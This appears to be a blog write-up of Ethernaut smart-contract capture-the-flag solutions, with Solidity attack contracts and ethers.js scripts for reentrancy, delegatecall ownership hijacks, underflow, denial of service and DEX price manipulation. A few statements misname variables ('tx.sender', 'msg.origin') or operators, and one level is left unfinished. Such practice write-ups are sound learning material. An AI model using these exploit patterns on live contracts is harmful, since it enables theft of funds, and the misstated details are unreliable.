---
layout: post
title:  "OZ's ethernaut challenges"
date:   2022-12-08 16:08:31 +0530
---

Exploits and explanations of ethernaut solutions as of Decemeber 2022.

P.S. Do not expect detailed description. You can most probably find articles with in-depth details out there somwhere.


## hello ethernaut

Follow the instructions

---

## fallback

Goal is to become owner and drain all funds. Well you can obviously drain all the funds using `withdraw()` once you are the owner. 

`owner` is only being updated in the `receive()` which is triggered if we send some ether to contract directly, but it has a check for contribution. 

To clear this level
- trigger `contribute` with 0.001 ether
- send some ether directly (as there is a check on `msg.value` as well) from metamask (or however you want)
- trigger `withdraw`

---

## fallout

This contract is compiled in 0.6.0 and as you can notice after enough staring at the code that the contract name and contructor name are different (`Fallout` and `Fal1out`). Just trigger the constructor (in this case it acts like just another public function without any checks) again.

---

## coin flip

Goal is to get 10 consecute flips accurate.
Blockchain being a deterministic system. It's not possible to get randomness and all that jing-bang with block number and block hash is futile

Contract with the below function easily "predicts" the flip and calls the contract's flip
```solidity
function callFlip() public {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;

    uint256 guess = blockValue.div(FACTOR);
    bool side = guess == 1 ? true : false;
    coinFlip.flip(side);
  }
```

---

## telephone

This challenge is again straightforward. When a contract function is triggered by another contract, `tx.origin` is the address of EOA which initiates the tx and `tx.sender` is the address of the caller contract.

To solve this, just create a new contract and call `changeOwner`

```solidity

import "../telephone/Telephone.sol";

contract TelephoneHack {

    Telephone telephone;
    constructor(address telephoneAddress) {
        telephone = Telephone(telephoneAddress);
    }
    function changeOwner() public {
        telephone.changeOwner(msg.sender);
    }
}
```

---

## token

First thing to notice is the compiler version, it is 0.6.0 which is pre 0.8.0 overflow underflow checks and since there is no  `SafeMath` library used, it is vulnerable to the attack.

There is no goal mentioned, we can assume the goal is to transfer all the balances to player. It's a small contract with the only non-view function exposed `transfer`.

[solidity integer overflow and underflow](https://hackernoon.com/hack-solidity-integer-overflow-and-underflow)

You have an initial 20 tokens. You can check this with `await token.totalSupply()`. To get all the remaining tokens. You need to underflow the contract i.e, trigger transfer with the value 21 so that `balances[msg.sender] -= _value;` will be 
`20 - 21 => 2^256 - 1`

```solidity
const tx = await token.transfer(ethers.constants.AddressZero, ethers.utils.parseEther("21"));
await tx.wait()
console.log(await token.balanceOf(owner.address));
```

---

## delegation

Delegate calls executes functions of other contract in the context of the caller contract. It's like borrowing logic for execution. If that logic changes the storage, it's changing the storage of the caller contract.

In this level both `Delegation` and `Delegate` have `owner` in their first storage slot, `pwn` in delegate is a public function with no access control. Calling `pwn` from Delegation using delegate will change the storage slot of Delegation using the execution logic Delegate (no access control).

```solidity
let delegate = await Delegate.attach(INSTANCE_ADDRESS);
const tx = await delegate.pwn();
await tx.wait();
```
---

## force

Goal is to force some ether in the contract. As you can see the contract has no `receive` implmeneted, we can not send the ether directly. Here comes the interesting part, to send eth to a contract adress there are three ways
- constructor while deploying the contract
- send via transfer or call if receive is implemented
- selfdestruct another contract with the beneficiary as the contract you'd like to force

`selfdestruct` doesn't check if the receive is implemented or not. Contract will have to accept the ether. We'll use this one

Deploy a new contract and destruct it with the beneficiary as the instance address
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceHack {
    constructor() payable {}
    function destruct(address payable forceAddress) public {
        selfdestruct(forceAddress);
    }
}
```

in the javascript

```javascript
const force = Force.attach(INSTANCE_ADDRESS);
const forceHack = await ForceHack.deploy({ value: 1 });
await forceHack.deployed()
console.log(await ethers.provider.getBalance(forceHack.address));

const tx = await forceHack.destruct(force.address);
await tx.wait();
console.log(await ethers.provider.getBalance(force.address));
```

---

## vault

`private` keyword only restricts visibility of a variable from other smart contracts not from the external world. Blockchain data is public be it public, private or constant. To unlock the vault we need to access the the storage slot which stores password

1st slot will have bool locked (slot id 0x0)

2nd slot is the password (slot id 0x1)

```javascript
const storage = await ethers.provider.getStorageAt(vault.address, "0x1", "latest");
const tx = await vault.unlock(storage);
```

---

## king

Things to notice here
- external call using `transfer` in `receive` doesn't check the return response.
- to become the king you need to send some eth to this contract
- next user sending eth to this contract will trigger a transfer to the existing king

Since there is no response check or try / catch in the external call. It can be blocked by reverting everytime and render the contract unusable. This is called Denial of Service attack.

To clear this level. We need to implement a new contract (KingAttack contract) and send some ether to King contract from the KingAttack contract which will make the KingAttack new king. 

KingAttack should revert on receive to make the King contract unusable

```solidity
contract KingAttack {
    function sendPayment(address king) external payable {
        (bool success, ) = payable(address(king)).call{value: msg.value}("");
        require(success, "External call success");
    }
    receive () external payable {
        require(!true, "Ha Ha Ha");
    }
}
```

```javascript
const tx = await kingAttack.sendPayment(king.address, {value: hre.ethers.utils.parseEther("0.002")});
```
0.002 because the value should be more than or equals current prize


---

## reentrancy

As the name states this is a simple reentrancy problem. 

[What is a Reentrancy Attack by Certik](https://www.certik.com/resources/blog/3K7ZUAKpOr1GW75J2i0VHh-what-is-a-reentracy-attack)

In this challenge, `(bool result,) = msg.sender.call{value:_amount}("");` allows the receiver to reenter using receive fallback. As you can see the balances are updated after the call, we can trigger the withdraw again

```solidity
contract ReentranceHack {
    address public instanceAddress;
    constructor(address instance) {
        instanceAddress = instance;
    }
    function withdraw() public {
        IReentrance(instanceAddress).withdraw(0.0005 ether);
    }
    receive() external payable {
        IReentrance(instanceAddress).withdraw(0.0005 ether);
    }
}
```

```javascript
tx = await reentrance.donate(reentranceHack.address, {value: hre.ethers.utils.parseEther("0.0005")})
await tx.wait();

tx = await reentranceHack.withdraw();
await tx.wait();

console.log(await ethers.provider.getBalance(reentrance.address));
```

---

## elevator

The goal is to reach the top, i.e. boolean value for `top` should be true. The only public function is `goTo`. The challenge also has an interface for Building. We need to deploy a Building contract which satisfies the conditions in the goTo and make us reach at the top. 

There are 2 calls to building contract and an interesting thing to notice is that the call `isLastFloor` is a non-view call, meaning we change the state inside the Building contract between the two subsequent calls. This makes our life easy

```solidity
contract BuildingHack is Building {
    bool step = false;
    function isLastFloor(uint) external returns (bool) {
        bool prevStep = step;
        step = !prevStep;
        return prevStep;
    }

    function goTo(address elevatorAddress) public {
        Elevator elevator = Elevator(elevatorAddress);
        elevator.goTo(0);
    }
}
```

```javascript
const BuildingHack = await hre.ethers.getContractFactory("BuildingHack");
const building = await BuildingHack.deploy();
await building.deployed()

console.log(`building deployed on ${building.address}`);

const tx = await building.goTo(INSTANCE_ADDRESS);
await tx.wait()
console.log(await elevator.top());
```

---

## privacy

This challenge is very similar to the challenge **vault**. Only difference is, this challenge requires some knowledge of how evm packs data while storing and how an array is stored.

[How to read Ethereum contract storage](https://medium.com/@dariusdev/how-to-read-ethereum-contract-storage-44252c8af925)

Let's go through the contract and how the data will be stored.

```solidity
bool public locked = true;
uint256 public ID = block.timestamp;
uint8 private flattening = 10;
uint8 private denomination = 255;
uint16 private awkwardness = uint16(block.timestamp);
bytes32[3] private data;
```

- `locked` will be stored in the first slot `0x0`
- `uint256` is 32 bytes and cannot be stored in the first slot so `ID` will take `0x1`
- Next 3 variables are `uint8`, `uint8` and `uint16` respectively totalling upto 32 bytes. All these variables will be packed in slot `0x2` 
- `data` is an array of bytes32 elements and will fill slot from `0x3` to `0x5`

To unlock the contract we need to get the last element of data array which is stored in slot `0x5`, trim it to 16 bytes and trigger the `unlock`

```javascript
data = await ethers.provider.getStorageAt(INSTANCE_ADDRESS,"0x5","latest");
```

Rest I beleive is quite striaghtforward

---

## gatekeeperone

This level is tricky, especially the gate number 1 and still wip. Will fill in the details later

---

## gatekeepertwo

The goal is set entrant as the player's address via `enter`, which is protected by three modifiers or gates. Let's talk about each one of them individually

`gateOne` => To clear this gate `msg.sender` and `msg.origin` should be different, meaning the call should come from a smart contract rather than EOA. 

`gateTwo` => To clear this gate the code size of the smart contract calling this function should be zero. Smart contract at the time of creation do not have code stored in the blockchain. It's only after the constructor call is done, smart contract have a runtime bytecode. We should trigger the function during the creation step.

`gateThree` => This gate looks tricky but actually is not. RHS is just 0x111...11 (32 bytes) the max value of uint256. LHS is bitwise OR of `_gateKey` typecasted as `uint64` and some operation of `msg.sender` which can be calculated easily.

- Things to note here is that msg.sender is the smart contract not the player's address

Let's do some maths, assume the equation is `a ^ b == c` where `c` is 1111 (4 bits instead of 64*8) and `a` is known.
we need `b` such that the above equation is true. `XOR` operation (`^`) gets 1 if exactly one  of the two values are 1, which means if `a` is 0101, `b` should be 1010, if `a` is 0000 `b` should be `1111`. Conclusion `b` has to be flipped bits of `a` which is a bitwise not operation.

Since `b` in `uint64(_gateKey`) we can set it as the `~a` (NOT operator)

```solidity
contract GatekeeperTwoHack {
  constructor(address instance) {
    bytes8 _gateKey = ~bytes8(keccak256(abi.encodePacked(address(this))));
    GatekeeperTwo gatekeeper = GatekeeperTwo(instance);
    gatekeeper.enter(_gateKey);
  }
}
```
Simply deploy this contract to clear the level

---

## naught coin

The contract inherits OZ's ERC20 meaning all the public functions are available to us. There are two ways to transfer in ERC-20
- via `transfer` funtion which is blocked via modifier
- via `transferFrom` which is can be triggered by some address (spender) with the appropriate allowance and as we can see there is no checks on `approve` and `transferFrom`. We can exploit the contract using this.

Give allowance of all the tokens to an address or a contract and trigger `transferFrom`

```solidity
 contract NaughtCoinHack {
  
  function transfer(address instance) public {
    NaughtCoin coin = NaughtCoin(instance);
    uint256 INITIAL_SUPPLY = 1000000 * (10**uint256(18));
    coin.transferFrom(msg.sender, address(this), INITIAL_SUPPLY);
  }
}
```

```javascript
let tx = await naughtCoin.approve(naughtCoinHack.address, hre.ethers.utils.parseEther("1000000"));
await tx.wait();
tx = await naughtCoinHack.transfer(INSTANCE_ADDRESS);
await tx.wait();
console.log(await naughtCoin.balanceOf(owner.address));
```

---

## preservation

Interesting challenge!

The goal is simple, to take the ownership of the contract. We see two public functions `setFirstTime` and `setSecondTime`, both delegating calls to `LibraryContract`. As we know delegate calls are executed in the context of calling of contract (Delegation challenge above) and it poses a risk of storage manipulation.

In `Preservation` contract first storage slot is occupied by `timeZone1Library` address and in the `LibraryContract` first slot in `storedTime` which can be set by `setTime`.

Delegating `setTime` from `Preservation` contract changes the first slot of the `Preservation`, meaning we can store anything there. This gives a hint that if we can store anything in the first slot using a poorly written contract and a delegate call, we can also change slot 3 which is `owner` using similar techniques. To clear this level we need to 

- inject a custom smart contract address in the first slot and make it `timeZone1Library`
- the custom smart contract should have a setTime function 
- then call `setFirstTime` and update the third slot with player's address

```solidity
contract LibraryContractHack {
    // stores a timestamp
    uint256 dummya;
    uint256 dummyb;
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```

This contract is using 3 storage slots and `setTime` is manipulating the third one which is owner in `Preservation`. Instead of using js, I simply created a new contract to make the contract calls (I hate doing type manipulation in javascript)

```solidity
contract PreservationHack {
    Preservation preservation;

    constructor(address instance) {
        preservation = Preservation(instance);
        LibraryContractHack libHack = new LibraryContractHack();
        preservation.setFirstTime(uint256(uint160(address(libHack))));
        preservation.setFirstTime(uint256(uint160(msg.sender)));
    }
}
```

Deploying this contract will clear the level. Things to notice here is that addresses needs to be typecasted in uint256 both times, for obvious reasons and since all this happens in a single transaction we didn't even need `setSecondTime`

---

## recovery

This is way too easy. Get the newly created contract address from the transaction of creating new level instance using some transaction explorer (etherscan) and trigger `destroy`

```javascript
const tx = await simpleToken.destroy(owner.address);
await tx.wait()
```

---

## magic number

This one is interesting. **What is the meaning of life** is a reference from the book Hitchhiker's guide to galaxy or h2g2 for short. Problem is simple, create a contract which returns `42` and has 10 bytes at max.

Resources that helped me
- [EVM: From Solidity to byte code, memory and storage](https://www.youtube.com/watch?v=RxL_1AfV7N4)
- [Deconstructing a Solidity Contract](https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737/)
- [evm.codes](https://www.evm.codes/)

In solidity this might be the simplistic solution, even this has 90 instructions! Try compiling it in remix
```solidity
contract Solve {
    function solve () external returns(uint256) {
        return 42;
    }
}
```

We need to manually write the contract

```solidity
// storing 42 in memory...

PUSH1(0x60) 0x2a  -> 0x602a // push 42 in stack
PUSH1(0x60) 0x80  -> 0x6080 // push a location for 42 to be stored
MSTORE(0x52)      -> 0x52 // store 42 in 0x80

// returning 42 from memory...

PUSH1(0x60) 0x20  -> 0x6020 // push length of the return value (32 bytes)
PUSH1(0x60) 0x80  -> 0x6080 // push location of the return value
RETURN(0xf3)      -> 0xf3 // return 42

0x602a60805260206080f3 // runtime opcodes
```

Next part is to deploy this contract. constructor call returns the runtime opcodes while creating a contract.

```solidity
contract MagicNumHack {
    constructor() public {
        assembly {
            mstore(0x00, 0x602a60805260206080f3) // store the runtime opcodes in memory location 0x00
            return(0x16, 0x0a) // return the runtime opcodes with parameters offset and size
        }
    }
}
```

```javascript
const MagicNumHack = await hre.ethers.getContractFactory("MagicNumHack");
const magicHack = await MagicNumHack.deploy();
await magicHack.deployed();

await magic.setSolver(magicHack.address)
```

Phew!

---

## alien codex

Goal is to become owner, which is slot `0x2` as `0x0` has the `bool` contact and `0x1` has the size of dynamic array. 

Check out [Mappings and Dynamic Arrays](https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html#mappings-and-dynamic-arrays) for understanding on why size is stored and the upcoming reasonings

Things to notics
- solidity version is 0.5.0
- `retract` is interesting. we can manipulate the size of dynamic array
- `revise` has no checks. we can update any index of array

Exploit works by triggering the `make_contact`, underflowing the length of array via `retract` and finally revising the slot storing owner. First 2 steps are stiaght forward, to find the storage location we need to understand the storage rules of dynamic array.

First element will be stored in `keccack256(1)`, 1 being the slot number and rest all will be sequentially stored. After the storage is filled, storage index will roll up because of overflow

```
0x0           0x00000....01
0x1           0x111111...11         <- size of array
0x2           0x<owner_address>
0x3           0x0000.....00
0x4           0x0000.....00
..
..
0x??          0x0000.....00         <- first element somewhere keccack(1) -
0x??          0x0000.....00         <- second element                      |
..                                                                         | number of elements + 2 is the location
..                                                                         |
0x111...11111 0x0000.....00         <- 2^256th slot                       -
```

To get the location we'll substract `0x11111..1111 - keccack(1)` location of first element and add `1`. Then simply trigger `revise`.

```solidity
contract AlienCodexHack {
  AlienCodex  alienCodex;

  constructor (address instance) public {
    alienCodex = AlienCodex(instance);
    alienCodex.make_contact();
    alienCodex.retract();
    uint256 MIN;
    uint256 MAX = ~MIN;
    uint256 loc = MAX - uint256(keccak256(abi.encode(1))) + 1;
    alienCodex.revise(loc, bytes32(bytes20(address(msg.sender))) >> 96);
  }
}
```
```javascript
const AlienCodexHack = await hre.ethers.getContractFactory("AlienCodexHack");
const alienCodexHack = await AlienCodexHack.deploy(alienCodex.address)
await alienCodexHack.deployed()
console.log(await alienCodex.owner())
```

--- 

## denial

The goal is to render this contract unusable. 

First thing to notice here is that we can set `partner` and there is not check that if `partner` is not a smart contract. This is can used later on. Moving on, there is no return value check after call `partner.call{value:amountToSend}("");` and it is a low level `call` which continues even after revert. So we can not simply revert the transaction.

Only way is to run the tranasction out of gas everytime. There are multiple ways to do that

```solidity
contract DenialHack {

    Denial denial;
    constructor (address instance) {
        denial = Denial(payable(instance));
        denial.setWithdrawPartner(address(this));
       
    }
    // allow deposit of funds
    receive() external payable {
        payable(address(denial)).call{value:msg.value}("");
        denial.withdraw();
    }
}
```

```javascript
const DenialHack = await hre.ethers.getContractFactory("DenialHack");
const denialHack = await DenialHack.deploy(denial.address);
await denialHack.deployed();
```

---

## shop

The goal is to set `price` different from what is defined in the contract after the sell. This challenge is very similar to the elevator challenge.

We need to implement a `Buyer` contract which returns different prices on subsequent `price` calls. But since `price` is a view call, we can not change state in the Buyer like we did in elevator. We'll check `isSold` and manipulate prices basis on the value

```solidity
contract BuyerHack is Buyer {
    Shop shop;

    constructor(address instance) {
        shop = Shop(instance);
        
    }

    function buy() public {
        shop.buy();
    }

    function price() public view returns (uint256) {
        if (shop.isSold()) {
            return 1;
        }
        return shop.price();
    }
}
```

```javascript
const BuyerHack = await hre.ethers.getContractFactory("BuyerHack");
const buyerHack = await BuyerHack.deploy(INSTANCE_ADDRESS);
await buyerHack.deployed();
const tx = await buyerHack.buy();
```

---

## dex

Goal is to drain 1 of the 2 tokens completely. After staring at the contract for a lot of time, I couldn't come up with any security flaw (solidity wise). I started triggering the swaps in the hope of finding out something new

```javascript
await token1.approve(dex.address, 10);
tx = await dex.swap(token1.address, token2.address, 10);
```
and then it clicked!! there is no invariant on `getSwapPrice`, everytime you perform swaps the prices will skew. Doing this few times get you the desired result

```javascript
await token1.approve(dex.address, 10)
tx = await dex.swap(token1.address, token2.address, 10);

await token2.approve(dex.address, 20)
tx = await dex.swap(token2.address, token1.address, 20);

await token1.approve(dex.address, 24)
tx = await dex.swap(token1.address, token2.address, 24);

await token2.approve(dex.address, 30)
tx = await dex.swap(token2.address, token1.address, 30);

await token1.approve(dex.address, 41)
tx = await dex.swap(token1.address, token2.address, 41);


await token2.approve(dex.address, 45)
tx = await dex.swap(token2.address, token1.address, 45);
```

## dex2

The goal is here is to drain both the tokens. The difference between dex and dex2 is that there is no check for Invalid Tokens. This makes life easier.

To clear this level we can deploy new token and manipulate prices to drain the actual tokens. 

```solidity
contract SwappableTokenTwoHack is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function mint(uint256 amount) public {
     _mint(msg.sender, amount);
  }
}
```

- deploy  `SwappableTokenTwoHack` and transfer 10 to dex and 10 to player initially
- 

```javascript
let SwappableTokenTwoHack = await hre.ethers.getContractFactory("SwappableTokenTwoHack");

SwappableToken = SwappableToken.connect(player)
SwappableTokenTwoHack = SwappableTokenTwoHack.connect(player)
let dummyToken = await SwappableTokenTwoHack.deploy(dex.address, "DM", "DM", 20);
await dummyToken.deployed();

dex = dex.connect(player)
token1 = token1.connect(player)
token2 = token2.connect(player)
dummyToken = dummyToken.connect(player)

tx = await dummyToken.transfer(dex.address, 10)
await tx.wait()
tx = await dummyToken.transfer(player.address, 10)
await tx.wait()
await (await dummyToken.approve(dex.address, 10)).wait()

tx = await dex.swap(dummyToken.address, token2.address, 10);
await tx.wait()

await (await dummyToken.mint(20)).wait()
await (await dummyToken.approve(dex.address, 20)).wait()

tx = await dex.swap(dummyToken.address, token1.address, 20);
await tx.wait()
```



